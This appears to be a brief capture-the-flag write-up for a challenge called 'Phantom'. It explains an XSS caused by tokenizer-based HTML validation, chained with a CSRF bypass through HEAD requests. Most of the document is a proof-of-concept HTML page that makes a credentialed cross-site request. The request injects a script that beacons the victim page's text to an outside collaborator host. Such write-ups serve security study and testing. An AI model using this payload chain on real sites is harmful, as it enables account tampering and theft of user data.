# Phantom

Self-XSS because of the validation with Tokenizer instead of Parser plus HEAD-based CSRF.

1. XSS works when using non-HTML namespace tags like `<svg><textarea><script>alert()</script></textarea></svg>`
2. CSRF protection can be bypassed on adding description by using HEAD method.

## POC

```html
<html>
  <body>
    <script>
      fetch('https://localtest.me:443/profile/edit?description=%3csvg%3e%3ctextarea%3e%3cscript%3enavigator.sendBeacon("https://6ryity9rcl45utozwwbc670zsqyhmda2.oastify.com",document.documentElement.innerText)%3c%2fscript%3e%3c%2ftextarea%3e%3c%2fsvg%3e', {
            method: 'HEAD',
            credentials: 'include',
            mode: 'cors'
        }).then(response => {
            // Handle response
            console.log(response);
        }).catch(error => {
            // Handle error
            window.open('https://localtest.me:443/profile')
        });
    </script>
  </body>
</html>

```